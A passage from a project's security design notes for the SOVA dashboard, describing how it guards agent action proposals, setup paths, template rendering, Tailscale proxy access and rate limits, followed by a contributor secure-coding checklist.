with `project_dir`, never read from an ambient context; the kinds whose services resolve their project from the request (start, stop, resume, handoff, mark and resume) refuse to execute when that project is not `ctx.project_dir`. A reason returned to the card, and so to the agent's next turn, is server-authored only: an unexpected exception is logged with its traceback and reported as a fixed message, and a draft's body stays out of logs and feed metadata. The caller that stores proposals must move one from pending to executing with an atomic compare-and-set before calling `confirm_action()`, so a proposal executes at most once; a failed one ends failed and is not re-run. The proposal storage, that compare-and-set, the `sova_propose_action` MCP tool and the confirm and dismiss routes bind to conversations and are not built yet (they wait on #1544's conversation tables), so the at-most-once guarantee and "a conversation turn holds no mutating tool" are not enforced by any code until they land.
- `POST /api/telemetry/ingest` authenticates in a route dependency, so auth failures (401/403/503) are returned before the body is validated and an unauthenticated caller never receives a 422 describing the schema. The body is read by hand afterwards, so the route checks the Content-Type itself (`application/json` or `+json`, else 415) and replaces raw bytes in a validation error with decoded text so a non-UTF-8 body is a 422, not a 500.
- The setup wizard endpoints (`/api/setup/browse`, `scan`, `install`, `configure`, `milestones/create`) only accept paths that resolve inside `dashboard.setup_roots` (default `["~"]`) or the project directory the dashboard serves. Candidate and roots are both `.resolve()`d and compared with `is_relative_to`, the root check runs before the existence check (403 versus 404 does not reveal whether a path outside the roots exists), and the error text does not name the roots. A config that fails to load leaves only the project directory, and a root entry that cannot be expanded (`~nosuchuser`) is logged and dropped. A client path that cannot be resolved (unknown `~user`, NUL byte) gets the same 403. Roots are loaded off the event loop with `asyncio.to_thread`. Browse additionally requires the start directory to exist (404 otherwise) and re-checks the directory it actually listed, because `setup_service.browse_directory` falls back to the parent of a non-directory; an empty path starts at the first configured root that is a directory, so a root that is not created yet never exposes its parent. The setup page starts with an empty path for that reason, and browse returns the `root` containing the listing so the breadcrumb renders ancestors above it as plain text. With no project in scope (the global multi-project hub) the roots come from `SOVA_DASHBOARD_SETUP_ROOTS` or the `["~"]` default, never from `load_config` of the working directory, so there the setting must be set in the server environment, as a JSON array (`SOVA_DASHBOARD_SETUP_ROOTS='["~/code"]'`); pydantic-settings parses list env vars as JSON only, so a comma-separated value makes the config fail to build and the wizard fails closed with the generic 403.
- `POST /api/projects/register` (multi-project hub) resolves its path with the setup wizard's own `resolve_allowed_setup_path()`, so the same `dashboard.setup_roots` (and the same `["~"]` default when unset) bound it, then requires a directory. Every bad path (empty, relative, outside the roots, a symlink or `..` escaping them, a file, a missing path) gets one generic 400 (an empty or relative path is refused before resolving, since `.resolve()` would turn it into the server's working directory), so the answer never reveals whether a path exists, and the registry and `init_db_for_project()` receive the resolved path.
- Dashboard templates build markup from third-party strings (directory names, Jira status names) with `esc()`, and pass paths through `data-*` attributes with delegated handlers rather than inline `onclick`. `TestInnerHtmlRatchet` in `tests/test_dashboard_script_injection.py` counts unescaped interpolations (each `${...}` or `+` operand, not whole statements) in `innerHTML` assignments across every template and static script, keeps that count from growing, and requires `setup.html` to have none beyond two audited pre-built joins.
- A Jinja value written into a `<script>` block goes through `|tojson`, which emits the whole JS literal; quoting `'{{ value }}'` by hand lets a backslash or quote in the value end the string (HTML autoescaping does not cover JS). `TestScriptBlockJinjaLiterals` in `tests/test_dashboard_script_injection.py` fails on any quoted `{{ ... }}` inside a script block without `tojson`. A project-scoped page (`_project_page()`) answers 404 for a slug the registry does not hold.
- On a loopback bind, read-only status endpoints do not need the guard, provided they leak no secret material (on a signed non-loopback bind every guarded read needs the signed cookie, above).
- Reverse proxy (Tailscale Serve, issue #1454): the dashboard keeps its loopback bind, and `tailscale serve --https=443 http://127.0.0.1:8111` publishes it to the operator's own tailnet devices. `dashboard.proxy_origins` lists the proxy's HTTPS origins (normalized to `https://host` or `https://host:port`; `http://`, a path, credentials and a loopback host are rejected), and each one is added to the allowed Hosts and Origins, so the CSRF guard, `TrustedHostMiddleware` and the websocket Origin check accept it with no other change. `ProxyIdentityMiddleware` (`sova/dashboard/security.py`, pure ASGI, so it covers pages, static files, API reads, SSE and the websocket alike) then requires a proxied request to carry a `Tailscale-User-Login` in `dashboard.proxy_allowed_logins` (compared case-insensitively). A request counts as proxied when its `Host` names a proxy origin or it carries a header a proxy adds (`X-Forwarded-For`, `X-Forwarded-Proto`, `X-Forwarded-Host`, `Forwarded`, `Tailscale-User-Login`): Serve forwards the client's own `Host` unchanged, so a tailnet client can send `Host: 127.0.0.1:8111` through it (measured), and the Host alone would let it skip the allowlist; a missing, empty or other login gets 403 (a websocket is closed with 1008 before `accept()`), and an empty allowlist refuses every proxied request and logs `dashboard.proxy_no_allowed_logins` at startup. A request carrying `Tailscale-Funnel-Request` is refused on any Host. The middleware is installed whatever `proxy_origins` holds (issue #1568): with it empty, `create_app()` passes an empty login allowlist, so a request carrying a proxy marker header is refused whatever `Tailscale-User-Login` it sends, even one listed in `dashboard.proxy_allowed_logins` (clearing `proxy_origins` turns remote access off while Serve still forwards, and startup logs `dashboard.proxy_logins_ignored` when logins are set without origins), while a plain loopback request passes. Both settings are server-wide and read once in `create_app()` from `_load_config_or_fail(resolved)`: the served project, or on the multi-project hub (`sova server start --multi`) the directory the server was started in, so there they belong in that directory's project or in `SOVA_DASHBOARD_PROXY_ORIGINS`/`SOVA_DASHBOARD_PROXY_ALLOWED_LOGINS` in the server environment, and a value saved in another project has no effect. Serve strips any client-sent `Tailscale-User-*` and `Tailscale-Funnel-Request` headers and sets its own login for tailnet users, so a tailnet device cannot claim another identity. The header is still forgeable from the machine itself: any local process can connect to the loopback port and send the proxy Host with an allowed login, which grants nothing it lacked before, since a loopback caller already has full access. Funnel must stay off: it would put the dashboard on the public internet, guarded only by this middleware's refusal of the Funnel header. Measured behind Serve (Tailscale 1.104.6 on macOS): Serve connects from `127.0.0.1` and sends `X-Forwarded-Proto: https` and `X-Forwarded-For: <client tailnet IP>`, which uvicorn's default `forwarded_allow_ips` trusts, so `request.url.scheme` is `https` (the CSRF cookie gets `Secure`) and the rate-limit key is each device's tailnet IP rather than one shared `127.0.0.1`.
- Rate limit (issue #1518): `dashboard.rate_limit_per_minute` (default 60, 0 disables it) limits each client, keyed by the address uvicorn resolved (behind Tailscale Serve, each device's tailnet IP from `X-Forwarded-For`), so one device exhausting its budget never throttles another. Routes declared on the app itself (`/healthz`, the pages) are limited by `slowapi`'s `SlowAPIMiddleware` and `default_limits`. That middleware finds a handler by scanning `app.routes` flat, and FastAPI keeps each included router as one `_IncludedRouter` entry there, so it never sees a route registered through `include_router()`. Those routes (the `/api` routes, `mcp.router` and the multi-project fleet manager router included) carry `rate_limit_dependency()` (`sova/dashboard/rate_limit.py`) instead, registered once per router in `_register_api_routers()` the way the CSRF guard is (and on the `/api/scheduler` router `SOVAServer` adds), so a new route is limited by construction. `/api/telemetry/ingest` keeps its own per-machine limit (`sova/dashboard/routers/telemetry.py`) instead, and the `/a2a` router is not limited. The dependency runs before the CSRF guard, so a request the guard rejects still counts. The budget is per route and client, not shared across routes: the bucket is the method, the registration prefix and the route's path template, so the Work and phone pages polling several routes at once stay within it, path parameters cannot mint fresh buckets, and the `/api` and `/p/{slug}/api` registrations of a route are counted apart (all projects on the hub share the `/p/{slug}/api` one). Past the limit the route answers 429 with `Retry-After`. Counters are in memory, per process, in a fixed one-minute window, and a limiter failure is logged (`dashboard.rate_limit_check_failed`) and lets the request through; so does a request whose matched route has no path template, with one `dashboard.rate_limit_route_unresolved` warning, rather than pooling every route into one bucket. Static files and the websocket are exempt (`rate_limit_key()` returns no key for them, and `agents.ws_router` carries no dependency), and so are the SSE routes, matched by route template against `STREAM_ROUTE_PATHS` (a test fails when a `StreamingResponse` route is missing from it), so a parameterized route such as `/roles/{name}` stays limited when asked for `/roles/stream`. Known gaps: a request whose JSON body does not parse is answered 422 before any dependency runs and is never counted (one that parses but fails validation is), and every local agent shares the loopback key, so all of them would share one `POST /api/mcp` budget (no SOVA client calls that route today: agents use the stdio `sova mcp` server). The busiest browser poll is the global batch status (`GET /api/queue/batch/{batch_id}/status`, every 5 s while a batch runs): 12 a minute per tab, so four tabs on one device stay under the default limit, and a 429 only skips that tick.
- See `.claude/rules/architecture.md` for the guard's implementation details.

## Contributor Checklist

1. **New subprocess calls**: use `sova/utils/shell.py:run()`, never `os.system()` or `shell=True`
2. **New credential fields**: add `repr=False` to the Pydantic Field, never log the value
3. **New git operations**: pass arguments as separate strings, quote user-provided values
4. **New LLM prompts**: separate data from instructions, validate output, handle errors non-fatally
5. **New file paths from external input**: validate with `Path.resolve()` + root check
6. **New API endpoints**: validate/sanitize all path parameters
7. **New log output**: apply `_redact_logs()` if the source may contain tokens or keys; render a database URL with `redact_database_url()` (`sova/db/session.py`, password hidden, placeholder for a URL that does not parse), and log a webhook URL by its hostname only (`sova/ipc/notifications.py`), since its path or query is the secret. Never log an httpx exception for a secret-bearing URL: its message carries the full URL
8. **New dashboard rendering**: render markdown through `renderMarkdown()`/`renderMarkdownInline()`, and write server values into a `<script>` block with `| tojson`
